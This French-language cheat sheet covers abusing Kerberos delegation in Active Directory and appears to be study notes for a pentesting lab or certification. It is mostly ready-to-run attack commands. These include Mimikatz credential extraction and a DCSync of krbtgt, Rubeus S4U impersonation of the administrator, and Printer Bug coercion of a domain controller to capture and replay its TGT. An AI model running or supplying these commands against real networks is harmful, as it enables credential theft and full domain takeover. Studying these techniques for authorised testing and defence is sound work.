# Cheatsheet - Delegation attacks

> [!summary] Objectif
> Détecter et abuser les délégations Kerberos. Ne jamais mélanger les 4 cas : unconstrained / constrained user / constrained computer / RBCD.

> [!abstract] Pourquoi · Chaînage
> **Repérer** un compte en délégation (unconstrained/constrained) = flag · **Exploiter** = usurper un DA (S4U ou capture de TGT + coercition).
> **Prérequis** accès/clé du compte délégué → **débloque** impersonation d'un DA sur le service cible.

### Unconstrained delegation

> Compromettre ce serveur permet de capturer le **TGT complet** de tout user qui s'y connecte (y compris un DA) et de le rejouer pour l'usurper intégralement — combiné à une coercition (Printer Bug), on force même le DC à s'y authentifier pour voler son TGT.

> [!warning]- Required
> Accès (code execution / admin local) sur le serveur en unconstrained delegation, pour y capturer les TGT entrants — voir [[Cheatsheet - Lateral movement]] / [[Cheatsheet - Privilege escalation]] pour l'obtenir.

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | Select-Object -ExpandProperty Name
```

### Constrained delegation

> Contrôler ce compte permet de s'authentifier **en tant que n'importe quel user du domaine** (via S4U2Self, sans connaître son mot de passe) auprès du service listé dans `msDS-AllowedToDelegateTo` — en ciblant un DA, ça donne un accès admin à ce service précis.

> [!warning]- Required
> Hash ou clé du compte qui porte la délégation contrainte (le `<svc>` de la commande ci-dessous) — s'obtient par DCSync ou extraction locale, voir [[Cheatsheet - Persistence]].

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
# Lire msDS-AllowedToDelegateTo sur un compte machine précis (flag F26)
Get-DomainComputer -Identity <target> -Properties samaccountname,msds-allowedtodelegateto
# AD Module (Import ActiveDirectory.psd1 requis)
Get-ADComputer -Identity <target> -Properties msDS-AllowedToDelegateTo
```

### Récupérer les clés du compte machine délégué (prérequis S4U)

```powershell
# Depuis un contexte admin local sur la box qui porte la délégation
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
Invoke-Mimikatz -Command '"lsadump::secrets"'   # LSA secrets = mot de passe machine chiffré
```

### Abuse constrained (S4U)

```powershell
Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /altservice:<svc> /ptt
```

### Unconstrained delegation — capturer + rejouer un TGT (F25)

```powershell
# 1. écouter les TGT entrants (admin local requis sur la box unconstrained)
C:\AD\Tools\Rubeus.exe monitor /interval:5 /nowrap

# 2. forcer le DC à s'authentifier via MS-RPRN (Printer Bug)
C:\AD\Tools\MS-RPRN.exe \\<DC_FQDN> \\<UNCONSTRAINED_BOX_FQDN>

# 3. rejouer le TGT capturé (base64) puis chaîner DCSync
C:\AD\Tools\Rubeus.exe ptt /ticket:<BASE64_TGT_CAPTURE>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

> [!note] Deux commandes à retenir d'abord : `Get-DomainComputer -Unconstrained` et `Get-DomainUser -TrustedToAuth`. RBCD (délégation définie côté cible, pas côté délégué) → fiche dédiée. Coercition (Printer Bug / MS-WSP / MS-DFSNM) et abus unconstrained → [[1. Cheatsheet - Toutes les commandes]].

## Related
- [[Cheatsheet - RBCD]]
- [[Cheatsheet - Trusts et forêts]]
- [[Synthèse - Kerberos]]
